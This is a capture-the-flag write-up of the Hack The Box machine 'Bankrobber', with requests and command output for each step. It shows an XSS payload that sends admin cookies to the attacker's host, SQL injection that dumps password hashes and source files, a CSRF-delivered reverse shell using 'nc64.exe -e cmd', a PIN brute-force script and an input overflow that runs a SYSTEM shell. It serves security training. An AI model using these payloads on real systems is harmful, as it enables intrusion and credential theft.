---
permalink: /posts/HTB/Bankrobber
title:  "HTB Bankrobber"
author: Luc Kolen
description: "Bankrobber is an insane Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Insane
  - Windows
  - XSS
  - XSRF
  - SQL
  - Hashcat
  - Chisel
  - Buffer overflow
---
# 10.10.10.154 - Bankrobber

- [10.10.10.154 - Bankrobber](#101010154---bankrobber)
  - [Open ports](#open-ports)
  - [http & ssl/http](#http--sslhttp)
    - [User account creation](#user-account-creation)
    - [XSS](#xss)
    - [Login as admin](#login-as-admin)
      - [SQL injection in user search](#sql-injection-in-user-search)
        - [Finding all tables](#finding-all-tables)
        - [Finding mysql usernames and hashes](#finding-mysql-usernames-and-hashes)
          - [Cracking the mysql hash](#cracking-the-mysql-hash)
      - [XSS to Backdoorchecker](#xss-to-backdoorchecker)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Bankrobber$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.154
```

|Port|Service|Version
|---|---|---|
80/tcp|http|Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
443/tcp|ssl/http|Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
445/tcp|microsoft-ds|Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp|mysql|MariaDB (unauthorized)

## http & ssl/http

It looks like the pages on http/80 and https/443 are the same. We'll explore the content on http/80 so we don't get any SSL certificate errors because the certificate uses `CN=localhost` instead of the real hostname.

First we'll run `Nikto` to see if there are vulnerabilities on the webserver.

```bash
nikto -ask=no -h http://10.10.10.154:80
...
+ /notes.txt: This might be interesting...
...
```

```http
GET /notes.txt HTTP/1.1

- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..
```

We now know that files are installed in the default Xampp folder, `C:\xampp`. This doesn't really help us at this point.

### User account creation

Browsing the website we find the login and register form on the `http://10.10.10.154/index.php` page. We don't have any credentials yet, but we can create an account and use that to login. We'll register the account `LucKolen` with password `LucKolen`.

![Register account](/assets/images/HTB-Bankrobber/1.a%20Register%20account.png)

![User page as LucKolen](/assets/images/HTB-Bankrobber/1.b%20user%20page%20as%20LucKolen.png)

### XSS

Logged in as LucKolen we've the option to transfer e-coin to other users. This form has 3 parameters, `amount`, `ID Of Addressee` and `Comment To Him/Her`.

![Sending money via user page](/assets/images/HTB-Bankrobber/1.c%20Sending%20money%20via%20user%20page.png)

The top of the user page shows that we have a balance of 1000 so we can try sending money to other users. Using this feature will result in a popup, `Transfer on hold. Ad admin will review it within a minute. After that he will decide whether the transaction will be dropped or not`. This sounds like we get access to an admin session if any of the fields we send are vulnerable to XSS.

We'll open the request in Burp Suite so we can use the repeater function instead of the website form to do our requests. This also allows us to bypass the client side filter that `amount` and `ID Of Addressee` are numbers.

```http
POST /user/transfer.php HTTP/1.1
...
Cookie: id=10; username=bHVja29sZW4%3D; password=THVjS29sZW4%3D
...

fromId=10&toId=1&amount=1&comment=Test
```

We can now add our own payload, the first parameter we'll check is `comment`. If our HTML isn't filtered we'll see the request in our netcat listener.

```http
POST /user/transfer.php HTTP/1.1

fromId=10&toId=1&amount=1&comment=<img src=http://10.10.14.16/Image.jpeg />
```

```bash
luc@kali:~/HTB/Bankrobber$ sudo nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:52419.
GET /Image.jpeg HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: nl-NL,en,*
Host: 10.10.14.16
```

We've confirmed that our HTML `<img>` tag is placed on the admin page and that the admin machine can connect to our machine on port 80.

The next step is checking to see how the cookies are saved in the browser.

![Cookies in browser](/assets/images/HTB-Bankrobber/1.d%20Cookies%20in%20browser.png)

We can see 3 values, `username` and `password` look to be URL encoded (`%3D` is `=`) Base64 strings. These cookies don't have the HttpOnly flag set so we can read them in JavaScript.

|Name|Value|Decoded value
|---|---|---|
|Password|THVjS29sZW4%3D|LucKolen
|Username|bHVja29sZW4%3D|luckolen
|id|10|10|

We can see that username is the lowercase version of our username and password is our password value. Getting the admin cookies should result in their credentials.

```http
POST /user/transfer.php HTTP/1.1

fromId=10&toId=1&amount=1&comment=<img+src%3dx+onerror%3dthis.src%3d"http%3a//10.10.14.16/%3fc%3d"%2bbtoa(document.cookie)+/>
```

```bash
luc@kali:~/HTB/Bankrobber$ sudo nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:52557.
GET /?c=dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ== HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: nl-NL,en,*
Host: 10.10.14.16
```

|Value|Base64 decoded|
|---|---|
|dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ==|username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; id=1|
|YWRtaW4%3D|admin
|SG9wZWxlc3Nyb21hbnRpYw%3D%3D|Hopelessromantic

We now have the admin credentials, username `admin` and password `Hopelessromantic`.

### Login as admin

As admin we've access to the `/admin` page, this page allows us to approve transactions, search users and to run commands on the server.

#### SQL injection in user search

Lets work from the top down so first we'll investigate the search users function.

```http
POST /admin/search.php HTTP/1.1

term=1
```

|ID|User|
|---|---|
|1|admin|

We can try a basic SQL injection here

```http
POST /admin/search.php HTTP/1.1

term%3d1'+or+'1'%3d'1
```

|ID|User|
|---|---|
|1|admin|
|2|gio|
|10|luckolen|

By sending the payload `term=1' or '1'='1` we don't only return the record where ID=1, but we return all records in that table.

A list of all users is interesting, but even more interesting is reading data from other tables.

```http
POST /admin/search.php HTTP/1.1

term%3d1'%2bunion%2bselect%2b'a','b','c
```

`term=1' union select 'a','b','c` will show `a` and `b` in the result table because the original SQL query also expects to get 3 columns and our UNION query matches that.

##### Finding all tables

The `information_schema.columns` table has the name of all tables and columns in the database.

```http
POST /admin/search.php HTTP/1.1

term=1'%2bunion%2bselect%2bconcat(table_name,'%3a',column_name),'b','c'+from+information_schema.columns+where+'1'%3d'1
```

|ID|User|
|---|---|
|balance:id|b|
|balance:userid|b|
|balance:amount|b
|hold:id|b
|hold:userIdFrom|b|
|hold:userIdTo|b|
|hold:amount|b|
|hold:comment|b|
|users:id|b|
|users:username|b
|users:password|b|

`1'+union+select+concat(table_name,':',column_name),'b','c' from information_schema.columns where '1'='1` gives us a list of all tables and their columns, default tables & columns are omitted on this page, but were in the actual results.

##### Finding mysql usernames and hashes

|ID|User|
|---|---|
|1|admin|
|a|b|

```http
POST /admin/search.php HTTP/1.1

term=1'+union+select+concat(user,':',password),'b','c' from mysql.user where '1'='1
```

|||
|---|---|
|1|admin|
|root:*F435725A173757E57BD36B09048B8B610FF4D0C4|b|
|:|b|
|pma:|b|

`1'+union+select+concat(user,':',password),'b','c' from mysql.user where '1'='1` will get the usernames and password hashes from the MYSQL.user table. Root has the password hash `*F435725A173757E57BD36B09048B8B610FF4D0C4`, there is a record without username or password and a record with username pma and no hash.

###### Cracking the mysql hash

We'll need to crack this hash to actually use it in the future, for this we'll use hashcat.

```bash
luc@kali:~/HTB/Bankrobber$ hashcat --example-hashes
...
MODE: 300
TYPE: MySQL4.1/MySQL5
HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130
PASS: hashcat
...
luc@kali:~/HTB/Bankrobber$ hashcat -m 300 --username hashes /usr/share/wordlists/rockyou.txt
...
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
...
luc@kali:~/HTB/Bankrobber$ hashcat -m 300 --username hashes /usr/share/seclists/Passwords/*
...
f435725a173757e57bd36b09048b8b610ff4d0c4:Welkom1!
...
```

Our default password list, `/usr/share/wordlists/rockyou.txt`, failed but this isn't the only password list we've access to. Using `/usr/share/seclists/Passwords/*` will use all password lists in [SecLists](https://github.com/danielmiessler/SecLists). That gave us the result `Welkom1!`.

The only service on an open port that we've credentials for is SMB so lets test those credentials there.

```bash
luc@kali:~/HTB/Bankrobber$ smbmap -H 10.10.10.154 -u root -p 'Welkom1!'
[!] Authentication error on 10.10.10.154
luc@kali:~/HTB/Bankrobber$ smbmap -H 10.10.10.154 -u administrator -p 'Welkom1!'
[!] Authentication error on 10.10.10.154
luc@kali:~/HTB/Bankrobber$ smbmap -H 10.10.10.154 -u gio -p 'Welkom1!'
[!] Authentication error on 10.10.10.154
```

#### XSS to Backdoorchecker

The admin page has the option to execute the `dir` command with any arguments as noted on the page:

```text
To quickly identify backdoors located on our server;
we implemented this function.
For safety issues you're only allowed to run the 'dir' command with any arguments.
```

```http
POST /admin/backdoorchecker.php HTTP/1.1

cmd=dir+-a
```

Executing this request results in an error message: `It's only allowed to access this function from localhost (::1). This is due to the recent hack attempts on our server.`. We'll need to bypass this restriction and we can try using our XSS for that, but first we'll go back to our SQL injection because we can use that to read source files. In [http & ssl/http](#http--sslhttp) we found a `notes.txt` file that mentioned that the default xampp folder was used to store the files.

```http
POST /admin/search.php HTTP/1.1

1'+union+select+'a',TO_BASE64(LOAD_FILE('c%3a/xampp/htdocs/admin/backdoorchecker.php')),'c
```

`1' union select 'a',TO_BASE64(LOAD_FILE('c:/xampp/htdocs/admin/backdoorchecker.php')),'c` will shows a base64 encoded version of the `c:/xampp/htdocs/admin/backdoorchecker.php` file.

```bash
luc@kali:~/HTB/Bankrobber$ mkdir source
luc@kali:~/HTB/Bankrobber$ cd source/
luc@kali:~/HTB/Bankrobber/source$ nano backdoorchecker.php.b64
...
The base64 string
...
luc@kali:~/HTB/Bankrobber/source$ cat backdoorchecker.php.b64 | base64 -d > backdoorchecker.php
```

We can now read the source code for `backdoorchecker.php`.

```php
<?php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad      = array('$(','&');
$good     = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
    $good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
    if(isset($_POST['cmd'])){
        // FILTER ESCAPE CHARS
        foreach($bad as $char){
            if(strpos($_POST['cmd'],$char) !== false){
                die("You're not allowed to do that.");
            }
        }
        // CHECK IF THE FIRST 2 CHARS ARE LS
        if(substr($_POST['cmd'], 0,strlen($good)) != $good){
            die("It's only allowed to use the $good command");
        }

        if($_SERVER['REMOTE_ADDR'] == "::1"){
            system($_POST['cmd']);
        } else{
            echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
        }
    }
} else{
    echo "You are not allowed to use this function!";
}
?>
```

We can already spot a bypass for the command filter. Only `dir` is allowed on Windows machines, but the only bad chars are `$(` and `&` so `||` is still an option to chain commands.

We can look at the admin page source code to see what code sends the command to run to the server.

```html
<button class="genric-btn" onclick="callSys(document.getElementById('cmd').value);"><span class="lnr lnr-arrow-right"></span></button>
```

![HTML Source admin page](/assets/images/HTB-Bankrobber/1.e%20HTML%20Source%20admin%20page.png)

We'll use the `ping` command to see if we have code execution on the server.

```javascript
var cmd = "dir | ping -n 1 10.10.14.16";
var http = new XMLHttpRequest();
var url = 'http://localhost/admin/backdoorchecker.php';
var params = 'cmd='+cmd;
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.send(params);
```

```bash
luc@kali:~/HTB/Bankrobber$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```http
POST /user/transfer.php HTTP/1.1

fromId=10&toId=1&amount=1&comment=<script+src%3dhttp%3a//10.10.14.16/payload.js></script>
```

```bash
luc@kali:~/HTB/Bankrobber$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
6:41:38.830727 IP 10.10.10.154 > 10.10.14.16: ICMP echo request, id 1, seq 1, length 40
16:41:38.830740 IP 10.10.14.16 > 10.10.10.154: ICMP echo reply, id 1, seq 1, length 40
```

We've now confirmed code execution on the machine and we can use this to start a reverse shell.

```bash
luc@kali:~/HTB/Bankrobber$ cp /home/luc/Downloads/netcat-win32-1.12/nc64.exe .
luc@kali:~/HTB/Bankrobber$ sudo python2 /opt/impacket/examples/smbserver.py share `pwd` -smb2support
```

We need `nc.exe` available to the machine so we run a SMB share

```javascript
var cmd = "dir | \\\\10.10.14.16\\share\\nc64.exe -e cmd 10.10.14.16 443";
var http = new XMLHttpRequest();
var url = 'http://localhost/admin/backdoorchecker.php';
var params = 'cmd='+cmd;
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.send(params);
```

We need to update the Javascript payload

```http
POST /user/transfer.php HTTP/1.1

fromId=10&toId=1&amount=1&comment=<script+src%3dhttp%3a//10.10.14.16/payload.js></script>
```

```bash
luc@kali:~/HTB/Bankrobber$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:53308.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\xampp\htdocs\admin>whoami
bankrobber\cortin

C:\xampp\htdocs\admin>cd \Users\cortin\Desktop

C:\Users\Cortin\Desktop>type user.txt
f6353466************************
```

## Privilege escalation

We can find an application `bankv2.exe` in the root of the `C:\` drive.

```bash
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is C80C-B6D3

 Directory of C:\

25-04-2019  19:50            57.937 bankv2.exe
25-04-2019  00:27    <DIR>          PerfLogs
22-08-2019  20:04    <DIR>          Program Files
27-04-2019  16:02    <DIR>          Program Files (x86)
24-04-2019  18:52    <DIR>          Users
16-08-2019  17:29    <DIR>          Windows
25-04-2019  00:18    <DIR>          xampp
               1 File(s)         57.937 bytes
               6 Dir(s)  33.126.555.648 bytes free
C:\>cacls bankv2.exe
C:\bankv2.exe
Toegang geweigerd.

C:\>icacls bankv2.exe
bankv2.exe: Toegang geweigerd.
Successfully processed 0 files; Failed processing 1 files
```

`Toegang geweigerd.` is `Access denied` in Dutch so we can't do anything with this file as `BANKROBBER\Cortin`.

```bash
C:\>netstat -ano | findstr LISTENING
...
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1640
...
C:\>tasklist | findstr 1640
bankv2.exe                    1640                            0        100 K
```

Checking all listening software has one port that sticks out, `910`. This port didn't show up during our NMAP scan, but we can use `nc64.exe` to access it localy.

```bash
C:\>\\10.10.14.16\share\nc64.exe 127.0.0.1 910
--------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 1234
 [!] Access denied, disconnecting client....

C:\>
```

The pin is 4 digits so we've 10000 possible solutions. The best way to attack this issue is from our own machine, but the port is only availabble on localhost. For this we'll use chisel.

```bash
luc@kali:~/HTB/Bankrobber$ cp /opt/chisel-binaries/chisel_1.6.0_windows_amd64.exe .
luc@kali:~/HTB/Bankrobber$ sudo /opt/chisel-binaries/chisel_1.6.0_linux_amd64 server -p 9000 --reverse
```

We need to run chisel as sudo because we'll bind port 910.

```bash
C:\>\\10.10.14.16\share\chisel_1.6.0_windows_amd64.exe client 10.10.14.16:9000 R:910:127.0.0.1:910
```

```bash
luc@kali:~/HTB/Bankrobber$ nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 1234
 [!] Access denied, disconnecting client....
```

We now have our tunnel running and this allows us to run a python script on our machine that will brute force the pin.

```python
#!/usr/bin/python3

import socket
import sys

for i in range(10000):
  value = f"{i:04d}"
  print("Trying: ", value)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(('127.0.0.1', 910))
  s.recv(4096)
  s.send(f"{value}\n".encode())
  r = s.recv(4096)
  print("Response: ", r)
  if not b"Access denied" in r:
    print("Success: ", value)
    break
  s.close
```

```bash
luc@kali:~/HTB/Bankrobber$ python3 bruteforce_pin.py
Trying:  0000
Response:  b' [!] Access denied, disconnecting client....\n'
Trying:  0001
Response:  b' [!] Access denied, disconnecting client....\n'
...
Trying:  0020
Response:  b' [!] Access denied, disconnecting client....\n'
Trying:  0021
Response:  b' [$] PIN is correct, access granted!\n --------------------------------------------------------------\n Please enter the amount of e-coins you would like to transfer:\n [$] '
Success:  0021
```

We now have the right pin to access the next step of the application.

```bash
luc@kali:~/HTB/Bankrobber$ nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 1
 [$] Transfering $1 using our e-coin transfer application.
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
```

Transfering coins isn't interesting for us, but we might be able to exploit this application.

```bash
luc@kali:~/HTB/Bankrobber$ nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] TEST
 [$] Transfering $TEST using our e-coin transfer application.
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
```

Sending text instead of a number doesn't make any errors show up.

```bash
luc@kali:~/HTB/Bankrobber$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
luc@kali:~/HTB/Bankrobber$ nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A using our e-coin transfer application.
 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

 [$] Transaction in progress, you can safely disconnect...
```

Sending a longer text string does result in something interesting, the application it would use to execute the e-coin transfer is replaced with part of our input. We can try using this to start our own software in case this isn't only a visual bug.

```bash
luc@kali:~/HTB/Bankrobber$ msf-pattern_offset -q 0Ab1
[*] Exact match at offset 32
luc@kali:~/HTB/Bankrobber$ python -c 'print "A"*32 + "\\\\10.10.14.16\\share\\nc64.exe -e cmd 10.10.14.16 444"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\10.10.14.16\share\nc64.exe -e cmd 10.10.14.16 444
```

We now know the offset and we already have access to `nc64.exe` on the machine so we can put our payload after 32 A characters.

```bash
luc@kali:~/HTB/Bankrobber$ nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\10.10.14.16\share\nc64.exe -e cmd 10.10.14.16 444
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\10.10.14.16\share\nc64.exe -e cmd 10.10.14.16 444 using our e-coin transfer application.
 [$] Executing e-coin transfer tool: \\10.10.14.16\share\nc64.exe -e cmd 10.10.14.16 444

 [$] Transaction in progress, you can safely disconnect...
```

Executing this payload shows a lot of activity on our SMB server, but no shell is created.

```bash
C:\Users\Public>copy \\10.10.14.16\share\nc64.exe
```

We now have `nc64.exe` on the target machine

```bash
luc@kali:~/HTB/Bankrobber$ nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Public\nc64.exe -e cmd 10.10.14.16 444
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Public\nc64.exe -e cmd 10.10.14.16 444 using our e-coin transfer application.
 [$] Executing e-coin transfer tool: C:\Users\Public\nc64.exe -e cmd 10.10.14.16 444

 [$] Transaction in progress, you can safely disconnect...
```

```bash
luc@kali:~/HTB/Bankrobber$ sudo nc -lnvp 444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:53949.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\Windows\system32>whoami
nt authority\system
C:\Windows\System32>cd \Users\admin\Desktop

C:\Users\admin\Desktop>type root.txt
aa65d8e6************************
```

We now have a successful reverse shell as `nt authority\system`.

## TL;DR

- Use XSS to get admin credentials from cookies
- Using SQL injection to read source code
- XSRF to get code execution
- Buffer overflow for administrator access
